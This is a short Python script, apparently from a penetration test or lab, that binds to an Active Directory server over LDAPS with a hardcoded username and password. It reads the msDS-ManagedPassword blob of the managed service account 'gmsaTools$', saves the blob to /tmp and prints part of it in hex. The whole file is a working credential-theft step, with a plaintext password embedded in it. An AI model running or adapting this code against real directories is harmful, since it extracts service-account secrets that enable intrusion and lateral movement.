import sys

try:
    from ldap3 import Server, Connection, NTLM, ALL
    server = Server('192.168.77.10', port=636, use_ssl=True, get_info=ALL)
    conn = Connection(server, user='cadre.local\\eng_cloud', password='Cl0ud_Eng!', authentication=NTLM, auto_bind=True)
    print('BIND_OK')
    conn.search('CN=Managed Service Accounts,DC=cadre,DC=local',
                '(sAMAccountName=gmsaTools$)',
                attributes=['msDS-ManagedPassword', 'msDS-ManagedPasswordId', 'msDS-ManagedPasswordPreviousId', 'objectGUID'])
    for e in conn.entries:
        print('DN', e.entry_dn)
        for attr in ('msDS-ManagedPassword', 'msDS-ManagedPasswordId', 'msDS-ManagedPasswordPreviousId', 'objectGUID'):
            try:
                val = e[attr].value
                if val is None:
                    print(attr, 'NOT_PRESENT')
                elif isinstance(val, bytes):
                    if attr == 'msDS-ManagedPassword':
                        open('/tmp/gmsa-blob.bin', 'wb').write(val)
                    print(attr, 'BYTES_LEN', len(val), 'HEX', val.hex()[:64])
                else:
                    print(attr, repr(val))
            except Exception as ex:
                print(attr, 'ERR', ex)
    conn.unbind()
except Exception as e:
    print('FAIL', e)
    sys.exit(1)
